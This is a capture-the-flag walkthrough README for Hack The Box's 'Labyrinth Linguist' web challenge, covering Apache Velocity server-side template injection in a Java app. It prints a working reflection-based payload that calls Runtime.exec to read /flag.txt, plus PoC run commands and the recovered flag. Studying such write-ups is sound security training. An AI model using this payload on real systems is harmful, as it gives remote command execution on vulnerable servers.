# Labyrinth Linguist

## Overview

This directory contains the local materials and saved solve workflow for the `Labyrinth Linguist` challenge on Hack The Box - CTF Try Out. The archived notes identify it as a `Easy` challenge. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.

## Challenge Profile

- Challenge: `Labyrinth Linguist`
- Category: `Web`
- Platform: `Hack The Box - CTF Try Out`
- Difficulty: `Easy`
- Saved PoC: `labyrinth_linguist_poc.sh`

## Directory Contents

- `Dockerfile`
- `build-docker.sh`
- `challenge/`
- `config/`
- `entrypoint.sh`
- `flag.txt`
- `labyrinth_linguist_poc.sh`
- `web_labyrinth_linguist.zip`

## First Commands To Run

Begin with a short inventory so you can see the original challenge archive, any extracted directories, and the solve script saved in this folder.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth_Linguist"
ls -lah
```

If you want to verify what was originally provided by Hack The Box, inspect the archive contents before extracting or re-extracting them.

```bash
unzip -l "web_labyrinth_linguist.zip"
```

Read the top of the PoC first. The comments there summarize the exact idea used during the solve and usually explain the bug, leak, algorithm, or reversing trick directly.

```bash
sed -n "1,220p" "labyrinth_linguist_poc.sh"
```

Run the PoC after reviewing the notes.

```bash
chmod +x "labyrinth_linguist_poc.sh"
./labyrinth_linguist_poc.sh
```

If the script targets a spawned remote service, you can usually point it at a fresh instance by supplying a host and port.

```bash
./labyrinth_linguist_poc.sh <HOST> <PORT>
```

## Walkthrough

Challenge: Labyrinth Linguist
Platform: Hack The Box - CTF Try Out
Category: Web
Difficulty: Easy

### Scenario summary

The application looks like a harmless "english to voxalith" translator, but the
backend is not actually translating text. Instead, it reads an HTML template file,
replaces the literal placeholder string TEXT with our input, and then feeds the
resulting page into Apache Velocity for template parsing.

Why that matters:
If user-controlled input is inserted into a server-side template before the engine
parses it, then the user is no longer just sending text. The user is sending code
in that template language.

In this challenge:
- The backend is Java / Spring.
- The template engine is Apache Velocity.
- Our input is inserted directly into the template body.
- That gives us Velocity SSTI.

### Relevant vulnerable logic from Main.java

line = line.replace("TEXT", replacement);
...
t.setData(runtimeServices.parse(reader, "home"));
t.merge(context, writer);

So the execution order is:
1. Read template file.
2. Replace TEXT with attacker-controlled input.
3. Parse and execute the modified template.

That means a payload like:
#set($x=7*7)$x
becomes active Velocity code and renders 49.

Real-world analogy:
Think of it like a CMS that lets users customize a page, but instead of storing the
text safely, it pastes that text straight into a server-side template compiler.
At that point, the "content" field becomes a programming interface.

Exploit strategy:
1. Confirm SSTI with a simple Velocity expression.
2. Use Java reflection from Velocity to reach java.lang.Runtime.
3. Run `cat /flag.txt`.
4. Capture command output with java.util.Scanner and print it into the page.

Why reflection is used:
Velocity gives us object and method access, but no direct shell helper.
Since Java strings expose .class / .getClass(), we can reach Class.forName(),
load Runtime, call getRuntime(), and then exec().

Payload core:
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($p=$rt.exec('cat /flag.txt'))
#set($sc=$x.class.forName('java.util.Scanner')
.getConstructor($x.class.forName('java.io.InputStream'))
.newInstance($p.getInputStream())
.useDelimiter('\\A'))
$sc.next()

Notes on the Scanner trick:
- Runtime.exec() gives back a Process.
- Process.getInputStream() exposes command stdout.
- Scanner(...).useDelimiter('\\A') reads the whole stream as one token.
- next() then returns the full command output as a single string.

Usage:
bash labyrinth_linguist_poc.sh
bash labyrinth_linguist_poc.sh http://154.57.164.74:31332/

Final flag recovered on this instance:
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b28a4e5618d3b6f7e34ddc500f9f19fa}

## Reproduction Commands

Use the following command sequence if you want a short and reliable path from opening the folder to reproducing the saved solve.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth_Linguist"
unzip -l "web_labyrinth_linguist.zip"
sed -n "1,220p" "labyrinth_linguist_poc.sh"
bash "labyrinth_linguist_poc.sh"
```

## Study Notes

This challenge is worth revisiting if you are practicing `Web` problems. The saved PoC is meant to be the fast path, but the better learning path is to inspect the provided files yourself first, confirm the weakness manually, and then compare your reasoning with the script comments and implementation.
